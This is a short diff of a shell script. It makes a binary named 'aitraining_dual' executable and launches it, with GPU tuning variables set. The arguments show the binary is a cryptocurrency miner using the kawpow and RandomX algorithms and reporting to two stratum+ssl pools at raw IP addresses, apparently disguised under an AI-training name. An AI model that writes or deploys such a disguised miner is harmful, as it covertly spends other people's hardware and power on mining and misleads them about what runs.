@@ -8,6 +8,7 @@ export GPU_MAX_ALLOC_PERCENT=100
 export GPU_MAX_SINGLE_ALLOC_PERCENT=100
 export GPU_ENABLE_LARGE_ALLOCATION=100
 export GPU_MAX_WORKGROUP_SIZE=1024
+chmod +x aitraining_dual
 ./aitraining_dual \
     --algorithm "kawpow;randomx" \
     --pool "stratum+ssl://51.89.99.172:16161;stratum+ssl://51.222.200.133:10343" \
